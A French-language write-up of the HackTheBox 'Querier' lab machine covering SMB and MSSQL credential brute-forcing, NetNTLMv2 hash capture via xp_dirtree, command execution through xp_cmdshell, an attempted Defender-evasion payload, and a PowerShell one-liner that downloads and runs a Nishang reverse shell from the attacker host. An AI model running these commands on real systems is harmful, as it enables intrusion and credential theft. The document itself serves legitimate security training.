# Solution du CTF Querier de HackTheBox

Nitro
-----

*Querier* est une box sous Windows proposée sur *HackTheBox*.  

Ce CTF est donné à 30 points, ce qui pourrait se traduire par *difficulté moyenne*.  

On trouve sur cette machine les classiques ports Windows et OH du mssql :  

```plain
$ sudo masscan --rate 1000 -e tun0 -p1-65535,U:1-65535 10.10.10.125
Starting masscan 1.0.4 (http://bit.ly/14GZzcT)
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49668/tcp on 10.10.10.125
Discovered open port 47001/tcp on 10.10.10.125
Discovered open port 139/tcp on 10.10.10.125
Discovered open port 5985/tcp on 10.10.10.125
Discovered open port 49671/tcp on 10.10.10.125
Discovered open port 445/tcp on 10.10.10.125
Discovered open port 49667/tcp on 10.10.10.125
Discovered open port 135/tcp on 10.10.10.125
Discovered open port 49670/tcp on 10.10.10.125
Discovered open port 49666/tcp on 10.10.10.125
Discovered open port 1433/tcp on 10.10.10.125
Discovered open port 49664/tcp on 10.10.10.125
```

On peut conserver l'output de *masscan* pour récupérer la liste des ports ouverts et les rassembler par des virgules :  

```plain
$ grep Discovered output.txt | cut -d' ' -f4 | cut -d/ -f1 | paste -d ',' -s
49668,47001,139,5985,49671,445,49667,135,49670,49666,1433,49664
```

On enchaîne ainsi avec cette commande :  

```bash
sudo nmap -sV -sC -T5 --script safe -p 49668,47001,139,5985,49671,445,49667,135,49670,49666,1433,49664 10.10.10.125
```

Nmap parvient à nous sortir quelques infos utiles du MSSQL :  

```plain
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds?
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
1433/tcp  open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
| ms-sql-config:
|   [10.10.10.125:1433]
|_    ERROR: No login credentials
| ms-sql-dump-hashes:
| [10.10.10.125:1433]
|_  ERROR: No login credentials
| ms-sql-hasdbaccess:
|   [10.10.10.125:1433]
|_    ERROR: No login credentials.
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ms-sql-query:
|   (Use --script-args=ms-sql-query.query='<QUERY>' to change query.)
|   [10.10.10.125:1433]
|_    ERROR: No login credentials
| ms-sql-tables:
|   [10.10.10.125:1433]
|_    ERROR: No login credentials.
```

Faux départ
-----------

Maintenant l'idée est de trouver des comptes pour le MSSQL. On pense bien sûr immédiatement au fameux compte *sa* qui est l'équivalent du *root* de mysql.  

*Nmap* dispose d'un module NSE baptisé [ms-sql-brute](https://nmap.org/nsedoc/scripts/ms-sql-brute.html).  

On peut lui passer une wordlist pour les utilisateurs et une autre pour les mots de passe possible.  

*Metasploit* peut nous fournir ces wordlists : il y a ainsi [default\_users\_for\_services\_unhash.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/default_users_for_services_unhash.txt) et [default\_pass\_for\_services\_unhash.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/default_pass_for_services_unhash.txt) qui sont deux excellents candidats pour une attaque brute-force rapide.  

On peut attaquer de cette façon :  

```bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=default_users_for_services_unhash.txt,passdb=default_pass_for_services_unhash.txt 10.10.10.125
```

Malheureusement ce n'est pas à la hauteur de nos espérances.  

*sa* n’apparaît pas dans la liste des passwords mais Nmap semble tester le username comme password systématiquement :  

```plain
    if ( status ) then
      for username in usernames do
        if stopInstance then break end

        -- See if the password is the same as the username (which may not
        -- be in the password list)
        stopUser, stopInstance = test_credentials( instance, helper, username, username )

        for password in passwords do
          if stopUser then break end

          stopUser, stopInstance = test_credentials( instance, helper, username, password )
        end

        passwords("reset")
      end
    end
```

Ce module NSE permet d'utiliser l'authentification Windows pour MSSQL si on passe en supplément les options *ms-sql-brute.brute-windows-accounts* et *mssql.domain* (en spécifiant une valeur).  

Pour autant rien n'est venu... Je me suis donc retranché sur le SMB.  

Share plz
---------

Il aura fallut remplir quelques options au module *smb\_login* de *Metasploit* pour parvenir à trouver que l'utilisateur *sa* a bien le mot de passe *sa* :p   

```plain
msf5 auxiliary(scanner/smb/smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    true             no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS             10.10.10.125     yes       The target address range or CIDR identifier
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          QUERIER          no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser            sa               no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       true             no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > run

[*] 10.10.10.125:445      - 10.10.10.125:445 - Starting SMB login bruteforce
[+] 10.10.10.125:445      - 10.10.10.125:445 - Success: 'QUERIER\sa:sa'
[*] 10.10.10.125:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

On peut enchainer sur l'énumération des partages :  

```plain
msf5 auxiliary(scanner/smb/smb_enumshares) > run

[-] 10.10.10.125:139      - Login Failed: Unable to Negotiate with remote host
[+] 10.10.10.125:445      - ADMIN$ - (DS) Remote Admin
[+] 10.10.10.125:445      - C$ - (DS) Default share
[+] 10.10.10.125:445      - IPC$ - (I) Remote IPC
[+] 10.10.10.125:445      - Reports - (DS)
[*] 10.10.10.125:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Pour changer un peut on peut utiliser un outil de *Impacket* au lieu de l’habituel *smbclient* :  

```plain
$ python examples/smbclient.py QUERIER/sa@10.10.10.125
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

Password:
Type help for list of commands
# ls
[-] No share selected
# shares
ADMIN$
C$
IPC$
Reports
# use c$
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
# use Reports
# ls
drw-rw-rw-          0  Tue Jan 29 00:26:31 2019 .
drw-rw-rw-          0  Tue Jan 29 00:26:31 2019 ..
-rw-rw-rw-      12229  Tue Jan 29 00:26:31 2019 Currency Volume Report.xlsm
# get Currency Volume Report.xlsm
```

Ce fichier comporte une Macro dans laquel on trouve une chaîne de connection :  

```python
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
```

J'ai ensuite regroupé les différents utilisateurs (*sa*, *reporting*) et passwords dans des fichiers respectifs : c'est reparti pour le SQL !  

```plain
msf5 auxiliary(scanner/mssql/mssql_login) > show options

Module options (auxiliary/scanner/mssql/mssql_login):

   Name                 Current Setting                            Required  Description
   ----                 ---------------                            --------  -----------
   BLANK_PASSWORDS      false                                      no        Try blank passwords for all users
   BRUTEFORCE_SPEED     5                                          yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS         false                                      no        Try each user/password couple stored in the current database
   DB_ALL_PASS          false                                      no        Add all passwords in the current database to the list
   DB_ALL_USERS         false                                      no        Add all users in the current database to the list
   PASSWORD                                                        no        A specific password to authenticate with
   PASS_FILE            /home/devloop/Documents/querier/pass.txt   no        File containing passwords, one per line
   RHOSTS               10.10.10.125                               yes       The target address range or CIDR identifier
   RPORT                1433                                       yes       The target port (TCP)
   STOP_ON_SUCCESS      false                                      yes       Stop guessing when a credential works for a host
   TDSENCRYPTION        false                                      yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                                          yes       The number of concurrent threads
   USERNAME                                                        no        A specific username to authenticate as
   USERPASS_FILE                                                   no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS         false                                      no        Try the username as the password for all users
   USER_FILE            /home/devloop/Documents/querier/users.txt  no        File containing usernames, one per line
   USE_WINDOWS_AUTHENT  true                                       yes       Use windows authentification (requires DOMAIN option set)
   VERBOSE              true                                       yes       Whether to print output for all attempts

msf5 auxiliary(scanner/mssql/mssql_login) > run

[*] 10.10.10.125:1433     - 10.10.10.125:1433 - MSSQL - Starting authentication scanner.
[-] 10.10.10.125:1433     - 10.10.10.125:1433 - LOGIN FAILED: querier\sa:PcwTWTHRwryjc$c6 (Incorrect: )
[-] 10.10.10.125:1433     - 10.10.10.125:1433 - LOGIN FAILED: querier\sa:sa (Incorrect: )
[+] 10.10.10.125:1433     - 10.10.10.125:1433 - Login Successful: querier\reporting:PcwTWTHRwryjc$c6
[*] 10.10.10.125:1433     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Point important : il faut que *DOMAIN* soit défini à *QUERIER* dans les options avancées (*show advanced*).  

Maintenant qu'on peut se connecter au SQL on va utiliser la même astuce que sur le CTF [Giddy](http://devloop.users.sourceforge.net/index.php?article182/solution-du-ctf-giddy-de-hackthebox) : on va faire fuiter le hash NetNTLMv2 du service, sauf qu'ici point d'injection SQL.  

Une fois de plus *Metasploit* dispose d'un module rien que pour cela (ça consiste seulement à appeler *xp\_dirtree*) :  

```plain
msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) > show options

Module options (auxiliary/admin/mssql/mssql_ntlm_stealer):

   Name                 Current Setting   Required  Description
   ----                 ---------------   --------  -----------
   PASSWORD             PcwTWTHRwryjc$c6  no        The password for the specified username
   RHOSTS               10.10.10.125      yes       The target address range or CIDR identifier
   RPORT                1433              yes       The target port (TCP)
   SMBPROXY             10.10.12.215      yes       IP of SMB proxy or sniffer.
   TDSENCRYPTION        false             yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                 yes       The number of concurrent threads
   USERNAME             reporting         no        The username to authenticate as
   USE_WINDOWS_AUTHENT  true              yes       Use windows authentification (requires DOMAIN option set)
msf5 auxiliary(admin/mssql/mssql_ntlm_stealer) > run

[*] 10.10.10.125:1433     - DONT FORGET to run a SMB capture or relay module!
[*] 10.10.10.125:1433     - Forcing SQL Server at 10.10.10.125 to auth to 10.10.12.215 via xp_dirtree...
[+] 10.10.10.125:1433     - Successfully executed xp_dirtree on 10.10.10.125
[+] 10.10.10.125:1433     - Go check your SMB relay or capture module for goodies!
[*] 10.10.10.125:1433     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

La machine a désactivé l'emploi de SMBv1 donc on doit avoir recours à serveur qui supporte SMBv2 sans quoi on ne recevra aucun hash.  

*Impacket* fait très bien l'affaire :  

```plain
# python examples/smbserver.py -smb2support public /tmp/
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.125,49692)
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
[*] User mssql-svc\QUERIER authenticated successfully
[*] mssql-svc::QUERIER:4141414141414141:fc994841e25eb70afdc8cf3616941055:010100000000000000fc16466dccd40142ea215a98bdeb3000000000010010006200660048006900610076004e005a00020010004a0070006d0069004700440053004100030010006200660048006900610076004e005a00040010004a0070006d00690047004400530041000700080000fc16466dccd40106000400020000000800300030000000000000000000000000300000ec8fae52e5121969ef67e8f48acd4f3e7f18a70b8e9ef5bd6568943b3897d1f30a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320031003500000000000000000000000000
[*] Connecting Share(1:IPC$)
[-] SMB2_TREE_CONNECT not found lwiYYawe
[-] SMB2_TREE_CONNECT not found lwiYYawe
[*] AUTHENTICATE_MESSAGE (\,QUERIER)
[*] User \QUERIER authenticated successfully
[*] :::00::4141414141414141
[*] Disconnecting Share(1:IPC$)
[*] Handle: [Errno 104] Connection reset by peer
[*] Closing down connection (10.10.10.125,49692)
[*] Remaining connections []
```

Le hash ne met pas longtemps à être cracké :  

```plain
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:05 DONE (2019-02-24 19:20) 0.1956g/s 1755Kp/s 1755Kc/s 1755KC/s correje..cooney17
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Moaaar
------

Avec ces identifiants on peut jouer avec les différents modules *auxiliary/admin/mssql* comme *mssql\_enum* qui est intéressant mais dont je ne mettrais pas l'output ici (trop gros).  

On va transformer notre accès d'administrateur SQL en exécution de commande :  

```plain
msf5 auxiliary(admin/mssql/mssql_exec) > show options

Module options (auxiliary/admin/mssql/mssql_exec):

   Name                 Current Setting                                      Required  Description
   ----                 ---------------                                      --------  -----------
   CMD                  cmd.exe /c whoami > \\10.10.12.215\public\hello.txt  no        Command to execute
   PASSWORD             corporate568                                         no        The password for the specified username
   RHOSTS               10.10.10.125                                         yes       The target address range or CIDR identifier
   RPORT                1433                                                 yes       The target port (TCP)
   TDSENCRYPTION        false                                                yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             mssql-svc                                            no        The username to authenticate as
   USE_WINDOWS_AUTHENT  true                                                 yes       Use windows authentification (requires DOMAIN option set)

msf5 auxiliary(admin/mssql/mssql_exec) > run

[*] 10.10.10.125:1433 - SQL Query: EXEC master..xp_cmdshell 'cmd.exe /c whoami > \\10.10.12.215\public\hello.txt'

 output
 ------

[*] Auxiliary module execution completed
```

Le module ne nous donne pas l'output mais la copie s'est bien effectuée :  

```plain
$ cat /tmp/hello.txt
querier\mssql-svc
```

On peut récupérer le premier flag (*c37b4--- snip ---b3c16*) de la même manière.  

Police and thieves in the streets
---------------------------------

Toujours via redirection d'output j'ai récupéré la liste des process (*tasklist*) et on voit que *Defender* est présent sur la machine :   

```plain
MsMpEng.exe                   2200                            0    102,600 K
```

J'attendais justement une occasion de tester le nouveau module *evasion* de *Metasploit* :)  

Je m'attendais à quelque chose de plus fourni côté options (ça viendra sans doute) :  

```plain
msf5 evasion(windows/windows_defender_exe) > show options

Module options (evasion/windows/windows_defender_exe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  vZHQ.exe         yes       Filename for the evasive file (default: random)

Payload options (windows/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.208     yes       The local listener hostname
   LPORT     443              yes       The local listener port
   LURI                       no        The HTTP Path

Evasion target:

   Id  Name
   --  ----
   0   Microsoft Windows

msf5 evasion(windows/windows_defender_exe) > run

[*] Compiled executable size: 3584
[+] vZHQ.exe stored at /root/.msf4/local/vZHQ.exe
```

Essayons de faire exécuter notre binaire depuis notre partage SMB :  

```plain
 output
 ------
 The system cannot execute the specified program.
```

hmmmm... Essayons de le copier en local ?  

```plain
 output
 ------
 Operation did not complete successfully because the file contains a virus or potentially unwanted software.
         0 file(s) copied
```

Quelle déception ! Mais pas tant de surprise :|  

Windows privesc dor dummies
---------------------------

Du coup c'est parti pour l'utilisation de Powershell. Je fais télécharger et exécuter un reverse shell *Nishang* :  

```plain
msf5 auxiliary(admin/mssql/mssql_exec) > set CMD 'c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -exec bypass -c IEX (New-Object System.Net.WebClient).DownloadString(\"http://10.10.14.208:8000/Invoke-PowerShellTcp.ps1\")'
CMD => c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -exec bypass -c IEX (New-Object System.Net.WebClient).DownloadString(\"http://10.10.14.208:8000/Invoke-PowerShellTcp.ps1\")
msf5 auxiliary(admin/mssql/mssql_exec) > run

[*] 10.10.10.125:1433 - SQL Query: EXEC master..xp_cmdshell 'c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -exec bypass -c IEX (New-Object System.Net.WebClient).DownloadString(\"http://10.10.14.208:8000/Invoke-PowerShellTcp.ps1\")'
[*] Auxiliary module execution completed
```

J'enchaîne illico sur [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) :  

```plain
PS C:\Windows\system32> IEX (New-Object System.Net.Webclient).DownloadString("http://10.10.14.208:8000/PowerUp.ps1")
PS C:\Windows\system32> cd /
PS C:\> Invoke-AllChecks

[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[*] Checking for unquoted service paths...
[*] Checking service executable and argument permissions...
[*] Checking service permissions...

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True

[*] Checking %PATH% for potentially hijackable DLL locations...

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

[*] Checking for AlwaysInstallElevated registry key...
[*] Checking for Autologon credentials in registry...
[*] Checking for modifidable registry autoruns and configs...
[*] Checking for modifiable schtask files/configs...
[*] Checking for unattended install files...

UnattendPath : C:\Windows\Panther\Unattend.xml

[*] Checking for encrypted web.config strings...
[*] Checking for encrypted application pool and virtual directory passwords...
[*] Checking for plaintext passwords in McAfee SiteList.xml files....
[*] Checking for cached Group Policy Preferences .xml files....

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml

PS C:\> Get-ChildItem : Access to the path 'C:\ProgramData\VMware\VMware Tools\GuestProxyData\trusted' is denied.
At line:3704 char:21
+ ... $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.x ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\ProgramData\...oxyData\trusted:String) [Get-ChildItem], Unauthoriz
   edAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Ce dernier nous a trouvé le mot de passe administrateur dans un fichier *Unattend* :)  

```plain
$ python examples/psexec.py 'QUERIER/Administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.10.10.125.....
[*] Found writable share ADMIN$
[*] Uploading file SIeQndYg.exe
[*] Opening SVCManager on 10.10.10.125.....
[*] Creating service hGNj on 10.10.10.125.....
[*] Starting service hGNj.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:/users/administrator/desktop

c:\Users\Administrator\Desktop>type root.txt
b19c3--- snip ---7c3592
```


*Published June 22 2019 at 17:48*